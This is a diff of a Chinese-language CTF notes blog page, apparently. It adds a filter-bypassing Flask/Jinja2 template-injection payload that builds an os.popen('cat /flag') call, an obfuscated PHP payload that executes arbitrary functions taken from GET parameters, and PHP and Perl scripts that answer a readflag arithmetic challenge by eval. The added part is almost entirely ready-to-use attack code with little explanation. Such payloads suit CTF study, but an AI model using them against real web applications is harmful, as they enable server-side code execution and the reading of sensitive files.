@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    10 分
                 </div>
                 
 
@@ -810,6 +810,98 @@ for i in range(0,x):
     rgb = line.split(", ")
     im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
 im.show()
+</code></pre>
+<h4 id="flask-ssti">flask ssti</h4>
+<pre><code>#Author：颖奇L'Amore
+{% set xhx = (({ }|select()|string()|list()).pop(24)|string())%}  # _
+{% set spa = ((app.__doc__|list()).pop(102)|string())%}  #空格
+{% set pt = ((app.__doc__|list()).pop(320)|string())%}  #点
+{% set yin = ((app.__doc__|list()).pop(337)|string())%}   #单引号
+{% set left = ((app.__doc__|list()).pop(264)|string())%}   #左括号 （
+{% set right = ((app.__doc__|list()).pop(286)|string())%}   #右括号）
+{% set slas = (y1ng.__init__.__globals__.__repr__()|list()).pop(349)%}   #斜线/
+{% set bu = dict(buil=aa,tins=dd)|join() %}  #builtins
+{% set im = dict(imp=aa,ort=dd)|join() %}  #import
+{% set sy = dict(po=aa,pen=dd)|join() %}  #popen
+{% set os = dict(o=aa,s=dd)|join() %}  #os
+{% set ca = dict(ca=aa,t=dd)|join() %}  #cat
+{% set flg = dict(fl=aa,ag=dd)|join() %}  #flag
+{% set ev = dict(ev=aa,al=dd)|join() %} #eval
+{% set red = dict(re=aa,ad=dd)|join()%}  #read
+{% set bul = xhx*2~bu~xhx*2 %}  #__builtins__
+
+#拼接起来 __import__('os').popen('cat /flag').read()
+{% set pld = xhx*2~im~xhx*2~left~yin~os~yin~right~pt~sy~left~yin~ca~spa~slas~flg~yin~right~pt~red~left~right %} 
+
+
+{% for f,v in y1ng.__init__.__globals__.items() %} #globals
+	{% if f == bul %} 
+		{% for a,b in v.items() %}  #builtins
+			{% if a == ev %} #eval
+				{{b(pld)}} #eval(pld)
+			{% endif %}
+		{% endfor %}
+	{% endif %}
+{% endfor %}
+</code></pre>
+<h4 id="php-bypass字符">php bypass字符</h4>
+<pre><code>
+code=$_=&quot;&quot;/&quot;&quot;;$_=&quot;$_&quot;;$____=&quot;+&quot;==&quot;+&quot;;$__=$_{$____};$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___=&quot;_&quot;;$___.=$__;$__=$_{$____};$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$__%2b%2b;$___.=$__;${$___}{_}(${$___}{__});
+
+
+//执行了 $_GET{_}($_GET{__})
+</code></pre>
+<h4 id="执行readflag算式">执行readflag算式</h4>
+<pre><code>&lt;?php
+$descriptorspec = array(
+    0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),
+    1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),
+    2 =&gt; array(&quot;file&quot;, &quot;/tmp/error-output.txt&quot;, &quot;a&quot;) 
+);
+
+$process = proc_open('/tmp/easy_flag', $descriptorspec, $pipes);
+
+if (is_resource($process)) {
+    $question = fread($pipes[1],1024);
+    $question = fread($pipes[1],1024);
+    $question = explode(&quot;\n&quot;,$question);
+    var_dump($question[0]);
+    $result = eval(&quot;return $question[0];&quot;);
+    fwrite($pipes[0], $result);
+    fclose($pipes[0]);
+    //var_dump($result);
+
+    $flag = fread($pipes[1],1024);
+
+
+    fclose($pipes[1]);
+    var_dump($flag);
+    
+    $return_value = proc_close($process);
+
+    echo &quot;command returned $return_value\n&quot;;
+}
+
+?&gt;
+</code></pre>
+<pre><code>#!/usr/bin/env perl
+use warnings;
+use strict;
+use IPC::Open2;
+$| = 1;
+my $pid = open2(\*out2, \*in2, &quot;/tmp/easy_flag&quot;) or die;
+my $reply = &lt;out2&gt;;
+print STDOUT $reply;
+$reply = &lt;out2&gt;;
+print STDOUT $reply;
+my $answer = eval($reply);
+print STDOUT &quot;answer: $answer\\n&quot;;
+print in2 &quot; $answer &quot;;
+in2-&gt;flush();
+$reply = &lt;out2&gt;;
+print STDOUT $reply;
+$reply = &lt;out2&gt;;
+print STDOUT $reply;
 </code></pre>
 
             </div>
